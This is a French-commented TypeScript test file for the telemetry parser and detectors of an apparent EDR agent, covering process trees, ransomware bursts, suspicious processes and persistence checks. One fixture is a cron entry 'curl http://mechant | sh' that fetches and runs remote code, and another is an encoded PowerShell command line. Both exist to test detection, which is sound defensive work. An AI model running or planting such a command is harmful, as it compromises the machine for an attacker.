// La télémétrie EDR que le compagnon envoie à Odin (pour Argos) : lecture des sorties des outils du système
// (processus, connexions), arbre de filiation, détection d'une rafale de rançongiciel, repérage de ce qui est louche,
// et normalisation de ce que le poste envoie (c'est une donnée, jamais un ordre : tout est borné et nettoyé).
import assert from 'node:assert/strict';
import test from 'node:test';
import {
  arbreProcessus, filiation, lireConnexionsWindows, lireProcessusPosix, lireProcessusWindows,
  normaliserTelemetrie, persistanceSuspecte, processusLouche, rafaleRancongiciel,
  type Processus,
} from '../src/valhalla/compagnon/telemetrie.ts';

test('lecture des processus (Linux/macOS, ps) : pid, parent, utilisateur, nom et ligne de commande', () => {
  const out = [
    '    1     0 root     systemd         /sbin/init',
    '  842     1 root     sshd            /usr/sbin/sshd -D',
    ' 1337   842 pierre   bash            -bash',
    'xx invalide',
  ].join('\n');
  const p = lireProcessusPosix(out);
  assert.equal(p.length, 3);
  assert.deepEqual(p[1], { pid: 842, ppid: 1, utilisateur: 'root', nom: 'sshd', ligne: '/usr/sbin/sshd -D', chemin: '/usr/sbin/sshd' });
});

test('lecture des processus (Windows) : lignes « pid|ppid|nom|chemin|ligne »', () => {
  const out = ['4|0|System||', '1200|4|svchost.exe|C:\\Windows\\System32\\svchost.exe|svchost -k netsvcs', 'rien'].join('\n');
  const p = lireProcessusWindows(out);
  assert.equal(p.length, 2);
  assert.equal(p[1].pid, 1200); assert.equal(p[1].ppid, 4); assert.equal(p[1].chemin, 'C:\\Windows\\System32\\svchost.exe');
});

test('lecture des connexions sortantes (Windows, netstat) : seulement les établies vers Internet', () => {
  const out = [
    '  TCP    192.168.1.5:139    0.0.0.0:0    LISTENING    4',
    '  TCP    192.168.1.5:50512  93.184.216.34:443    ESTABLISHED    1200',
    '  TCP    192.168.1.5:50520  127.0.0.1:445    ESTABLISHED    5',
    '  UDP    0.0.0.0:500        *:*    ',
  ].join('\n');
  const c = lireConnexionsWindows(out);
  // L'écoute et la boucle locale sont écartées ; reste la connexion établie vers Internet.
  assert.equal(c.length, 1);
  assert.deepEqual(c[0], { proto: 'tcp', rip: '93.184.216.34', rport: 443, pid: 1200 });
});

test('arbre de filiation : qui a lancé quoi, sans boucler même sur un cycle', () => {
  const procs: Processus[] = [
    { pid: 1, ppid: 0, nom: 'init' },
    { pid: 10, ppid: 1, nom: 'bash' },
    { pid: 20, ppid: 10, nom: 'curl' },
    { pid: 30, ppid: 10, nom: 'python' },
    { pid: 99, ppid: 100, nom: 'orphelin' }, // parent absent → racine
  ];
  const racines = arbreProcessus(procs);
  const init = racines.find((r) => r.proc.pid === 1)!;
  assert.ok(init);
  assert.deepEqual(init.enfants.map((e) => e.proc.pid), [10]);
  assert.deepEqual(init.enfants[0].enfants.map((e) => e.proc.pid).sort(), [20, 30]);
  assert.ok(racines.some((r) => r.proc.pid === 99), 'un processus sans parent connu est une racine');
  // Filiation d'un processus : lui, son parent, son grand-parent.
  assert.deepEqual(filiation(procs, 20).map((p) => p.nom), ['curl', 'bash', 'init']);
  // Un cycle (parent qui se rattache à un descendant) ne fait pas boucler.
  const cycle: Processus[] = [{ pid: 1, ppid: 2, nom: 'a' }, { pid: 2, ppid: 1, nom: 'b' }];
  assert.ok(arbreProcessus(cycle).length >= 1);
  assert.ok(filiation(cycle, 1).length <= 2);
});

test('rafale de rançongiciel : beaucoup de fichiers réécrits dans un dossier en peu de temps', () => {
  const base = 1_000_000_000_000;
  const evts = Array.from({ length: 30 }, (_, i) => ({ chemin: `/home/pierre/docs/f${i}.txt`, action: 'réécrit' as const, t: base + i * 1000 }));
  const r = rafaleRancongiciel(evts, { fenetreMs: 60_000, seuil: 25 });
  assert.ok(r, 'une rafale est repérée');
  assert.equal(r!.dossier, '/home/pierre/docs');
  assert.ok(r!.nombre >= 25);
  // Quelques créations éparses ne font pas une rafale.
  assert.equal(rafaleRancongiciel([{ chemin: '/a/x', action: 'créé', t: base }, { chemin: '/a/y', action: 'réécrit', t: base + 1000 }], { seuil: 25 }), undefined);
});

test('ce qui est louche : un programme lancé d\'un dossier temporaire, une persistance douteuse', () => {
  assert.ok(processusLouche({ pid: 5, ppid: 1, nom: 'x.exe', chemin: 'C:\\Users\\p\\AppData\\Local\\Temp\\x.exe' }));
  assert.ok(processusLouche({ pid: 6, ppid: 1, nom: 'powershell.exe', ligne: 'powershell -enc ZQBjAGgAbwA=' }));
  assert.equal(processusLouche({ pid: 7, ppid: 1, nom: 'sshd', chemin: '/usr/sbin/sshd' }), undefined);
  assert.ok(persistanceSuspecte({ genre: 'run', nom: 'maj', cible: 'C:\\Users\\p\\Downloads\\maj.exe' }));
  assert.ok(persistanceSuspecte({ genre: 'cron', nom: 'x', cible: 'curl http://mechant | sh' }));
  assert.equal(persistanceSuspecte({ genre: 'systemd', nom: 'nginx', cible: '/usr/sbin/nginx' }), undefined);
});

test('normalisation de la télémétrie reçue : bornée, nettoyée, le poste est imposé par Odin', () => {
  const t = normaliserTelemetrie('Portable-Pierre', {
    sys: 'windows',
    poste: 'triché', // ignoré : le poste vient du jeton, pas du corps
    processus: [{ pid: 10, ppid: 1, nom: 'a\u0000b' }, { pid: 0, nom: 'sans pid' }, 'pas un objet'],
    connexions: [{ rip: '1.2.3.4', rport: 443, proto: 'tcp' }, { rip: 'pas-une-ip', rport: 1 }],
    persistance: [{ genre: 'run', nom: 'x', cible: 'y' }, { genre: 'inconnu', nom: 'z' }],
    rafale: { nombre: 40, secondes: 12, dossier: '/d' },
    osquery: true,
  }, 123);
  assert.equal(t.poste, 'Portable-Pierre');
  assert.equal(t.sys, 'windows'); assert.equal(t.t, 123); assert.equal(t.osquery, true);
  assert.equal(t.processus.length, 1); assert.equal(t.processus[0].nom, 'a b', 'les caractères de contrôle sont retirés');
  assert.equal(t.connexions.length, 1); assert.equal(t.persistance.length, 1);
  assert.deepEqual(t.rafale, { nombre: 40, secondes: 12, dossier: '/d' });
});
